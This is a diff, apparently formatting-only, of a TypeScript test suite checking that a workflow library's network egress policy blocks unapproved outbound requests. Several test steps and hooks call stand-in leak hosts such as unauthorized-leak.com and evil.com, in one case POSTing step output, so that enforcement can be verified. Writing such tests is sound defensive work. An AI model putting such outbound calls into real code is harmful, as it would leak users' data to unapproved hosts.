@@ -8,14 +8,14 @@ import {
     toGraph,
     NetworkPolicyViolationException,
     uninstallNetworkInterceptors,
-    ExecutionPhase
+    ExecutionPhase,
 } from '../../index';
 
 describe('Network Egress Policy End-to-End Integration Suite', () => {
     let mockLocalServer: http.Server;
     let localPort: number;
 
-    before((done) => {
+    before(done => {
         mockLocalServer = http.createServer((_req, res) => {
             res.writeHead(200, { 'Content-Type': 'application/json' });
             res.end(JSON.stringify({ status: 'ok', service: 'mock-local-api' }));
@@ -27,7 +27,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
         });
     });
 
-    after((done) => {
+    after(done => {
         uninstallNetworkInterceptors();
         mockLocalServer.close(done);
     });
@@ -80,7 +80,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                 return await fetch(param.url);
             }).networkPolicy({
                 allowedHosts: ['api.github.com'],
-                allowLocalhost: true
+                allowLocalhost: true,
             });
 
             expect(syncStep.networkPolicy()!.allowedHosts).to.deep.equal(['api.github.com']);
@@ -99,8 +99,8 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                 await fetch('https://external-leak.com/batch');
                 return item.toUpperCase();
             })
-            .reduce('items')
-            .denyNetwork();
+                .reduce('items')
+                .denyNetwork();
 
             try {
                 await batchStep.execute({ items: ['item1', 'item2'] });
@@ -121,7 +121,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
 
             const safeWorkflow = flow(rogueStep).networkPolicy({
                 defaultPolicy: 'deny',
-                allowedHosts: ['api.stripe.com'] // Flow only allows stripe.com
+                allowedHosts: ['api.stripe.com'], // Flow only allows stripe.com
             });
 
             try {
@@ -141,7 +141,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
             }).allowNetwork(['api.stripe.com', '127.0.0.1']); // Narrowed only to Stripe, sendgrid is excluded
 
             const multiServiceWorkflow = flow(narrowedStep).networkPolicy({
-                allowedHosts: ['api.stripe.com', 'api.sendgrid.com']
+                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
             });
 
             try {
@@ -161,16 +161,19 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
             });
 
             const workflow = flow(dynamicStep).networkPolicy({
-                allowedHosts: ['api.stripe.com', 'api.sendgrid.com']
+                allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
             });
 
             // Per-execution override removes sendgrid from perimeter
             try {
-                await workflow.run({}, {
-                    networkPolicy: {
-                        allowedHosts: ['api.stripe.com']
-                    }
-                });
+                await workflow.run(
+                    {},
+                    {
+                        networkPolicy: {
+                            allowedHosts: ['api.stripe.com'],
+                        },
+                    },
+                );
                 expect.fail('Per-execution run policy should have blocked sendgrid');
             } catch (err: any) {
                 expect(err).to.be.instanceOf(NetworkPolicyViolationException);
@@ -230,9 +233,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                 return { blocked: false };
             }).denyNetwork();
 
-            const parallelWorkflow = flow(
-                parallel(allowedStep, blockedStep, { mode: 'allSettled' })
-            );
+            const parallelWorkflow = flow(parallel(allowedStep, blockedStep, { mode: 'allSettled' }));
 
             const result: any = await parallelWorkflow.run();
 
@@ -290,10 +291,10 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
         it('intercepts and blocks unauthorized network egress inside onAfter hook', async () => {
             const stepWithAfterLeak = Step.create('afterLeakStep', () => ({ computed: 42 }))
                 .denyNetwork()
-                .onAfter(async (output) => {
+                .onAfter(async output => {
                     await fetch('https://unauthorized-leak.com/enrich', {
                         method: 'POST',
-                        body: JSON.stringify(output)
+                        body: JSON.stringify(output),
                     });
                     return output;
                 });
@@ -313,11 +314,11 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
             const stepWithFailLeak = Step.create('failLeakStep', () => {
                 throw new Error('Action failed');
             })
-            .denyNetwork()
-            .onFail(async (_err, retry) => {
-                await fetch('https://unauthorized-leak.com/fail-webhook');
-                retry({ recovered: true });
-            });
+                .denyNetwork()
+                .onFail(async (_err, retry) => {
+                    await fetch('https://unauthorized-leak.com/fail-webhook');
+                    retry({ recovered: true });
+                });
 
             try {
                 await stepWithFailLeak.execute();
@@ -337,7 +338,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                     const data = await res.json();
                     return data.status === 'ok';
                 })
-                .onAfter(async (output) => {
+                .onAfter(async output => {
                     const res = await fetch(`http://127.0.0.1:${localPort}/`);
                     const data = await res.json();
                     return { ...output, service: data.service };
@@ -356,7 +357,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
 
             const workflow = flow(stepA, stepB).networkPolicy({
                 allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
-                allowLocalhost: true
+                allowLocalhost: true,
             });
 
             const graphNode = toGraph(workflow);
@@ -364,7 +365,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                 enabled: true,
                 defaultPolicy: 'deny',
                 allowedHosts: ['api.stripe.com', 'api.sendgrid.com'],
-                allowLocalhost: true
+                allowLocalhost: true,
             });
 
             const inspected = inspectGraph(workflow);
@@ -375,14 +376,14 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                 enabled: true,
                 defaultPolicy: 'deny',
                 allowedHosts: ['api.stripe.com'],
-                allowLocalhost: false
+                allowLocalhost: false,
             });
 
             expect(nodeB?.metadata?.networkPolicy).to.deep.equal({
                 enabled: true,
                 defaultPolicy: 'deny',
                 allowedHosts: [],
-                allowLocalhost: false
+                allowLocalhost: false,
             });
         });
     });
@@ -393,7 +394,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                     validate: async () => {
                         await fetch('https://unauthorized.com/val');
                         return true;
-                    }
+                    },
                 })
                 .allowNetwork(['api.stripe.com']);
 
@@ -414,7 +415,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                     transform: async (val: string) => {
                         await fetch('https://unauthorized.com/trans');
                         return val.toUpperCase();
-                    }
+                    },
                 })
                 .allowNetwork(['api.stripe.com']);
 
@@ -435,7 +436,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                     translate: async (val: string) => {
                         await fetch('https://unauthorized.com/trans');
                         return val.toLowerCase();
-                    }
+                    },
                 })
                 .allowNetwork(['api.stripe.com']);
 
@@ -457,7 +458,7 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
                         const res = await fetch(`http://127.0.0.1:${localPort}/`);
                         const data = await res.json();
                         return data.status === 'ok';
-                    }
+                    },
                 })
                 .networkPolicy({ allowLocalhost: true });
 
@@ -467,16 +468,15 @@ describe('Network Egress Policy End-to-End Integration Suite', () => {
         });
 
         it('enforces flow-level network policy within Step.spec', async () => {
-            const step = Step.create('flowScopedSpecStep', async (param: any) => param)
-                .spec('field', {
-                    validate: async () => {
-                        await fetch('https://evil.com/check');
-                        return true;
-                    }
-                });
+            const step = Step.create('flowScopedSpecStep', async (param: any) => param).spec('field', {
+                validate: async () => {
+                    await fetch('https://evil.com/check');
+                    return true;
+                },
+            });
 
             const workflow = flow(step).networkPolicy({
-                allowedHosts: ['api.stripe.com']
+                allowedHosts: ['api.stripe.com'],
             });
 
             try {
